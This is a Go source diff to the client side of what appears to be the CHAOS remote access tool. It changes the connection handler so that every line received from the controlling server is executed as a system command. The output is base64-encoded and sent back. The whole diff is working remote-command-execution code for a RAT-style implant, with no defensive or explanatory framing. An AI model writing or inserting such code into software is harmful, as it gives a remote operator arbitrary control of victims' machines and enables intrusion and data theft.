@@ -2,6 +2,7 @@ package connection
 
 import (
 	"bufio"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	log "github.com/sirupsen/logrus"
@@ -9,6 +10,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/models"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"net"
+	"strings"
 )
 
 var Delimiter string = "\n"
@@ -40,8 +42,28 @@ func (c ConnectionHandler) Handle() error {
 	}
 
 	for {
-		message, _ := bufio.NewReader(c.Connection).ReadString('\n')
-		fmt.Print("Message from server: " + message)
+		message, err := bufio.NewReader(c.Connection).ReadString('\n')
+		if err != nil {
+			log.WithField("cause", err.Error()).Error("error reading from connection")
+			continue
+		}
+
+		switch strings.TrimSpace(message) {
+		default:
+			c.WriteCommandResponse(message)
+		}
+	}
+}
+
+func (c ConnectionHandler) WriteCommandResponse(input string) {
+	fmt.Print("Message from server: " + input)
+	output := util.RunCmd(input, 10)
+
+	outputStr := base64.StdEncoding.EncodeToString(output)
+	fmt.Println(outputStr)
+
+	if err := c.Write(outputStr); err != nil {
+		log.WithField("cause", err.Error()).Error("error writing command output")
 	}
 }
 
